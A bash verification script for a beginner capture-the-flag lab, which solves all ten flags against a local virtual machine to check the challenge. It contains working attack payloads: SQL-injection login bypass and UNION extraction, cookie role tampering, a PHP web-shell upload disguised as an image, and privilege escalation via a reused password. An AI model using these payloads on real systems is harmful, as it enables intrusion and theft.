#!/usr/bin/env bash
# verify.sh — proves all 10 flags, run from the host but exercising the
# guest's own loopback via SSH, so networking quirks of this qemu test
# rig never matter.
set -euo pipefail
cd "$(dirname "$0")/.."

KEY="keys/ctfbuilder_ed25519"
PORT=2202
HOST="ctfbuilder@127.0.0.1"
SSH_OPTS=(-i "$KEY" -p "$PORT" -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10)
RELEASE_SECRET=$(cat ../organizer/release-secret.txt)

SSH() { ssh "${SSH_OPTS[@]}" "$HOST" "$@"; }

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import hmac, hashlib
d = hmac.new('$RELEASE_SECRET'.encode(), f'beginner-reading-room:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

F1=$(SSH "curl -s http://localhost/ | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 1 "$F1"

JAR=/tmp/jar.txt
F2=$(SSH "curl -s -c $JAR -d 'username=librarian&password=librarian123' http://localhost/staff/login.php -L | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 2 "$F2"

SESSID=$(SSH "awk '/PHPSESSID/{print \$7}' $JAR")
F3=$(SSH "curl -s -H 'Cookie: PHPSESSID=$SESSID; role=admin' http://localhost/staff/dashboard.php | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 3 "$F3"

F4=$(SSH "curl -s http://localhost/backup/catalog_backup.sql.txt | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 4 "$F4"

JAR5=/tmp/jar5.txt
SSH "curl -s -c $JAR5 -d \"username=' OR '1'='1' -- &password=x\" http://localhost/staff/login.php -o /dev/null"
SESSID5=$(SSH "awk '/PHPSESSID/{print \$7}' $JAR5")
F5=$(SSH "curl -s -H 'Cookie: PHPSESSID=$SESSID5' http://localhost/staff/panel.php | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 5 "$F5"

RESP6=$(SSH "curl -s -G 'http://localhost/catalog/search.php' --data-urlencode \"q=zzz' UNION SELECT note, passphrase FROM staff_notes -- -\"")
F6=$(echo "$RESP6" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 6 "$F6"
PASSPHRASE=$(echo "$RESP6" | sed -n 's/.*— \(.*\)<\/li>.*/\1/p')

SSH "printf '<?php system(\$_GET[\"c\"]); ?>' > /tmp/shell.php && curl -s -F 'cover=@/tmp/shell.php;filename=shell.php;type=image/jpeg' http://localhost/catalog/upload.php -o /dev/null"
F7=$(SSH "curl -s -G http://localhost/uploads/shell.php --data-urlencode 'c=cat /opt/flag7.txt'")
check 7 "$F7"

SSH "curl -s -o /tmp/cover.jpg http://localhost/images/ledgers_of_dust.jpg"
F8=$(SSH "steghide extract -sf /tmp/cover.jpg -p '$PASSPHRASE' -xf /tmp/f8.txt -f >/dev/null && cat /tmp/f8.txt")
check 8 "$F8"

F9=$(SSH "curl -s -G http://localhost/uploads/shell.php --data-urlencode \"c=echo librarian123 | su mcurie -c 'cat /home/mcurie/flag9.txt'\"")
check 9 "$F9"

F10=$(SSH 'curl -s -G http://localhost/uploads/shell.php --data-urlencode "c=find /root/flag10.txt -exec cat {} \;"')
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
